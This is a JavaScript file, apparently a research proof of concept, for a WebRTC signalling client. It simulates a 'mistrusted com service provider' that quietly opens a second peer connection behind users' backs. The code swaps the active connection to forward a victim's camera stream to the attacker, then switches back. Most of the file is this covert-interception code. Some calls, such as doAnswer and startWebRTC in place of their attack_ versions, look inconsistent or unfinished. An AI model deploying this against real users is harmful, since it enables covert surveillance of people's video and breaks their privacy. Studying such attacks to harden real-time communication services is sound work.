'use strict';

var attack_room = webrtc_attack
//var socket = io.connect();

if (attack_room !== '') {
  console.log('Create or join room', attack_room);
  socket_attack.emit('create or join', attack_room);
}

socket_attack.on('created', function (room){
  console.log('Created room ' + attack_room);
  //isInitiator = true;
});

socket_attack.on('full', function (room){
  console.log('Room ' + attack_room + ' is full');
});

socket_attack.on('join', function (room){
  console.log('Another peer made a request to join room ' + attack_room);
  console.log('This peer is the initiator of room ' + attack_room + '!');
  isChannelReady = true;
});

socket_attack.on('joined', function (room){
  console.log('This peer has joined room ' + attack_room);
  isChannelReady = true;
});

socket_attack.on('log', function (array){
  console.log.apply(console, array);
});

////////////////////////////////////////////////
//				    GUI CMD                   //
////////////////////////////////////////////////
function attack_startUserMedia(){
	var constraints = {video: true};
	getUserMedia(constraints, handleUserMedia, handleUserMediaError);
	console.log('Getting user media with constraints', constraints);
}

function attack_callWebRTC(){
	isInitiator = true
    startWebRTC()
}

function attack_startWebRTC() {
	  attack_createPeerConnection()
	  pc.addStream(localStream)
}

////////////////////////////////////////////////
//				WEBRTC CONTROL				  //
////////////////////////////////////////////////
function attack_sendMessage(message){
	console.log('Client sending message on attack socket: ', message);
	socket_attack.emit('webrtc_attack', message);
}

////////////////////////////////////////////////
//				     ATTACK					  //
////////////////////////////////////////////////
var attack_pc = null
var aux
// Attack from mistrusted com service provider
// The com service provider open a new WebRTC session behind users back
socket_attack.on('webrtc_attack', function(message){
	console.log("received Attack")
	//Listen to Alice (initiator)
	if(isInitiator){
		
	    console.log('Client received message:', message);
	    if (message.type === 'offer') {
			//Switch to attack mode
			aux = pc
			pc = attack_pc
	     	attack_startWebRTC();
		  	console.log("created attack "+pc)
	      	pc.setRemoteDescription(new RTCSessionDescription(message));
	      	doAnswer();
	    } else if (message.type === 'answer') {
	      pc.setRemoteDescription(new RTCSessionDescription(message));
	    } else if (message.type === 'candidate') {
	      var candidate = new RTCIceCandidate({
	        sdpMLineIndex: message.label,
	        candidate: message.candidate
	      });
	      pc.addIceCandidate(candidate);
	    } else if (message === 'bye') {
	      pc.close()
		  pc = null
	    } else if (message === 'thanks') {
			// Revert to normal mode
			//Save attack_pc
			attack_pc = pc
			pc = aux
	    }

	}
});

////////////////////////////////////////////////////
//					USER MEDIA					  //
////////////////////////////////////////////////////

/////////////////////////////////////////////////////////
//						WEBRTC						   //
/////////////////////////////////////////////////////////
function attack_createPeerConnection() {
  try {
    pc = new RTCPeerConnection(null);
    pc.onicecandidate = attack_handleIceCandidate;
    pc.onaddstream = attack_handleRemoteStreamAdded;
    pc.onremovestream = attack_doNothing;
    console.log('Created RTCPeerConnnection');
  } catch (e) {
    console.log('Failed to create PeerConnection, exception: ' + e.message);
    alert('Cannot create RTCPeerConnection object.');
      return;
  }
}

function attack_doNothing(event){
	//Nothing
}

function attack_handleIceCandidate(event) {
  console.log('handleIceCandidate event: ', event);
  if (event.candidate) {
    attack_sendMessage({
      type: 'candidate',
      label: event.candidate.sdpMLineIndex,
      id: event.candidate.sdpMid,
      candidate: event.candidate.candidate});
  } else {
    console.log('End of candidates.');
  }
}

function attack_handleRemoteStreamAdded(event) {
	console.log('Add remote stream in attackMode')
	remoteVideo.src = window.URL.createObjectURL(event.stream);
	remoteStream = event.stream;
}


function attack_setLocalAndSendMessage(sessionDescription) {
  // Set Opus as the preferred codec in SDP if Opus is present.
  sessionDescription.sdp = preferOpus(sessionDescription.sdp);
  pc.setLocalDescription(sessionDescription);
  console.log('setLocalAndSendMessage sending message' , sessionDescription);
  attack_sendMessage(sessionDescription);
}

function attack_doAnswer() {
  console.log('Sending answer to peer.');
  pc.createAnswer(attack_setLocalAndSendMessage, RTCPeerConnectionErrorCallback, sdpConstraints);
}

function attack_stop() {
  isStarted = false;
  isInitiator = false;
  // isAudioMuted = false;
  // isVideoMuted = false;
  pc.close();
  pc = null;
}